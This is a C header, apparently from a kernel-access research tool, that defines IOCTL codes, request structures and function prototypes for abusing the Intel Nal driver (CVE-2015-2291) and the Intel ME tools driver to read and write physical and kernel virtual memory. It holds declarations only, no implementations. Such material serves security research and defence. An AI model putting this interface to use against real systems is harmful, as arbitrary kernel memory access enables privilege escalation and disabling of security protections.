/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2024
*
*  TITLE:       INTEL.H
*
*  VERSION:     1.42
*
*  DATE:        01 Apr 2024
*
*  Intel drivers interface header.
* 
*    Network Adapter iQVM64 driver aka Nal
*    Intel(R) Management Engine Tools Driver
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

//
// INTEL NAL driver interface for CVE-2015-2291.
//

#define INTEL_DEVICE_TYPE               (DWORD)0x8086
#define INTEL_DEVICE_FUNCTION           (DWORD)2049

#define NAL_FUNCID_MAPIOSPACE           (DWORD)0x19
#define NAL_FUNCID_UNMAPIOSPACE         (DWORD)0x1A
#define NAL_FUNCID_VIRTUALTOPHYSCAL     (DWORD)0x25
#define NAL_FUNCID_MEMSET               (DWORD)0x30
#define NAL_FUNCID_MEMMOVE              (DWORD)0x33

#define IOCTL_NAL_MANAGE  \
    CTL_CODE(INTEL_DEVICE_TYPE, INTEL_DEVICE_FUNCTION, METHOD_NEITHER, FILE_ANY_ACCESS) //0x80862007


typedef struct _NAL_REQUEST_HEADER {
    ULONG_PTR FunctionId;
    ULONG_PTR Unused0;
} NAL_REQUEST_HEADER, * PNAL_REQUEST_HEADER;

typedef struct _NAL_GET_PHYSICAL_ADDRESS {
    NAL_REQUEST_HEADER Header;
    ULONG_PTR PhysicalAddress;
    ULONG_PTR VirtualAddress;
} NAL_GET_PHYSICAL_ADDRESS, * PNAL_GET_PHYSICAL_ADDRESS;

typedef struct _NAL_MEMMOVE {
    NAL_REQUEST_HEADER Header;
    ULONG_PTR SourceAddress;
    ULONG_PTR DestinationAddress;
    ULONG_PTR Length;
} NAL_MEMMOVE, * PNAL_MEMMOVE;

typedef struct _NAL_MAP_IO_SPACE {
    NAL_REQUEST_HEADER Header;
    ULONG_PTR OpResult; //0 mean success
    ULONG_PTR VirtualAddress;
    ULONG_PTR PhysicalAddress;
    ULONG NumberOfBytes;
} NAL_MAP_IO_SPACE, * PNAL_MAP_IO_SPACE;

typedef struct _NAL_UNMAP_IO_SPACE {
    NAL_REQUEST_HEADER Header;
    ULONG_PTR OpResult; //0 mean success
    ULONG_PTR VirtualAddress;
    ULONG_PTR Unused0;
    ULONG NumberOfBytes;
} NAL_UNMAP_IO_SPACE, * PNAL_UNMAP_IO_SPACE;

//
// Intel ME driver.
//
#define PMXDRV_MAP_FUNCID       (DWORD)0xAAE
#define PMXDRV_UNMAP_FUNCID     (DWORD)0xAAF

#define IOCTL_PMXDRV_MAP_MEMORY     \
    CTL_CODE(FILE_DEVICE_UNKNOWN, PMXDRV_MAP_FUNCID, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x00222AB8

#define IOCTL_PMXDRV_UNMAP_MEMORY   \
    CTL_CODE(FILE_DEVICE_UNKNOWN, PMXDRV_UNMAP_FUNCID, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x00222ABC

#include <pshpack1.h>
typedef struct _PMX_MAPMEM_PACKET {
   ULONG Size;
   LARGE_INTEGER SectionOffset;
   UINT32 CommitSize;
   UINT64 Result;
} PMX_MAPMEM_PACKET, * PPMX_MAPMEM_PACKET;
#include <poppack.h>

typedef struct _PMX_UNMAPMEM_PACKET {
    ULONG Size;
    ULONG Reserved0[2];
    PVOID Address;
} PMX_UNMAPMEM_PACKET, * PPMX_UNMAPMEM_PACKET;

typedef struct _PMX_INPUT_BUFFER {
    PVOID Data;
    ULONG InputSize;
    ULONG Padding;
} PMX_INPUT_BUFFER, * PPMX_INPUT_BUFFER;

BOOL NalCallDriver(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID Buffer,
    _In_ ULONG Size);

BOOL NalMapAddressEx(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _Out_ ULONG_PTR* VirtualAddress,
    _In_ ULONG NumberOfBytes);

BOOL NalUnmapAddress(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_ ULONG NumberOfBytes);

BOOL NalVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress);

_Success_(return != FALSE)
BOOL NalReadVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

_Success_(return != FALSE)
BOOL WINAPI NalWriteVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

_Success_(return != FALSE)
BOOL WINAPI NalReadVirtualMemoryEx(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

_Success_(return != FALSE)
BOOL WINAPI NalWriteVirtualMemoryEx(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI PmxDrvQueryPML4Value(
    _In_ HANDLE DeviceHandle,
    _Out_ ULONG_PTR* Value);

BOOL WINAPI PmxDrvVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress);

BOOL WINAPI PmxDrvReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI PmxDrvWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI PmxDrvReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI PmxDrvWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);
